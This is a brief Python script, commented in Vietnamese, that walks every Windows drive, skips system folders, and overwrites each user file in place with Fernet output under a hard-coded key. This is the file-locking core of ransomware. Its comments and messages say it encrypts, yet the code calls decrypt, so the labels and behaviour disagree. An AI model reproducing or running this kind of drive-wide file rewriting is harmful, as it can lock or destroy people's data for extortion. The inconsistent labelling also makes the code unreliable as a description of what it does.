import os
import string
from cryptography.fernet import Fernet

# Khóa mã hóa (đảm bảo bạn lưu trữ nó nếu muốn giải mã sau này)
key = "hrVo-EeAc-nezBvX0Hfxn02pDAA9_93-XJhsdv7Vd1Q="

# Lấy danh sách tất cả ổ đĩa (trên Windows)
drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]

for drive in drives:
    for root, dirs, files in os.walk(drive, topdown=True):
        # Bỏ qua các thư mục hệ thống hoặc nhạy cảm (tùy chọn)
        dirs[:] = [d for d in dirs if d not in ['Windows', 'Program Files', 'Program Files (x86)', 'AppData']]
        for file_name in files:
            try:
                file_path = os.path.join(root, file_name)
                if os.path.isfile(file_path):
                    print(f"Mã hóa: {file_path}")
                    with open(file_path, "rb") as file:
                        data = file.read()
                    encrypted_data = Fernet(key).decrypt(data)
                    with open(file_path, "wb") as file:
                        file.write(encrypted_data)
            except Exception as e:
                print(f"Lỗi với {file_path}: {e}")
